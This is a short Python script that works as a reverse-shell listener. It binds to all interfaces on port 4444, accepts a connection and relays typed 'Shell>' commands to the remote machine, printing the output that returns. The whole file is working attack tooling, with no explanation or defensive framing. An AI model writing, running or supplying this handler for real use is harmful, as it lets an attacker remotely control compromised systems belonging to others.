import socket

host = '0.0.0.0'
port = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(1)
print(f"[+] Listening on {host}:{port}")
conn, addr = s.accept()
print(f"[+] Connection from {addr}")

while True:
    cmd = input("Shell> ")
    if cmd.lower() == 'exit':
        conn.send(b'exit')
        break
    conn.send(cmd.encode())
    print(conn.recv(4096).decode(), end='')
